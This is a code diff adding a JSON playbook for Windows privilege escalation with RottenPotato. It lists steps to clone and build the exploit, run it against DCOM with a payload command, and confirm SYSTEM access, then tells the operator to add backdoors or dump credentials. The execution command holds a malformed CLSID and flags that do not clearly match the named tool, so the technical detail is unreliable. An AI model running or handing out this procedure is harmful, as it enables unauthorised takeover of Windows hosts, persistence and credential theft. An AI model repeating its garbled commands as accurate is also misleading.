@@ -1,0 +1,31 @@
+{
+    "name": "Windows Privilege Escalation with Rotten Potato",
+    "description": "Exploit DCOM/RPC vulnerabilities to escalate privileges by manipulating access tokens in Windows environments with SeImpersonatePrivilege.",
+    "tools": [
+        {
+            "name": "RottenPotato",
+            "description": "Classic potato exploit using DCOM activation for token duplication and impersonation",
+            "url": "https://github.com/foxglovesec/RottenPotato"
+        }
+    ],
+    "steps": [
+        {
+            "index": 1,
+            "name": "Download and Build RottenPotato",
+            "command": "git clone https://github.com/foxglovesec/RottenPotato.git; Open RottenPotato.sln in Visual Studio and build for x86/x64",
+            "description": "Clone the repository, compile the C++ project, and transfer the resulting executable to the target Windows system."
+        },
+        {
+            "index": 2,
+            "name": "Execute RottenPotato",
+            "command": "./RottenPotato.exe -r 127.0.0.1 -c {F7A9F0E0-17A6-4F33-9F0E-0B7A9F0E0-17A} -l 135 -p cmd.exe /c whoami",
+            "description": "Run from a medium integrity process with SeImpersonatePrivilege, using loopback IP, a vulnerable CLSID (e.g., for DCOM), local port, and payload command to spawn an elevated process."
+        },
+        {
+            "index": 3,
+            "name": "Verify Escalation Success",
+            "command": "Use whoami /priv or Process Explorer to check for SYSTEM privileges",
+            "description": "Confirm the payload executes with high integrity; if successful, proceed to add backdoors or dump credentials."
+        }
+    ]
+}
